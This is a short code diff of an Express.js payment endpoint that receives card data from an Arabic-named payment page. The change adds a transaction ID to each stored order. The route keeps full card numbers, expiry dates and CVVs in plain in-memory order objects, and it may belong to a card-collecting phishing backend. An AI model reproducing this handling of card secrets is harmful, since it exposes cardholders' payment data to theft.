@@ -53,9 +53,10 @@ app.post('/submit-data', (req, res) => {
 
 // Step 2: Client submits card data from payment_new_ar.html
 app.post('/submit-card', (req, res) => {
-    const { orderId, cardName, cardNumber, expiryDate, cvv } = req.body;
+    const { orderId, transactionId, cardName, cardNumber, expiryDate, cvv } = req.body;
     const order = orders.find(o => o.id === orderId);
     if (order) {
+        order.transactionId = transactionId;
         order.cardName = cardName;
         order.cardNumber = cardNumber;
         order.expiryDate = expiryDate;
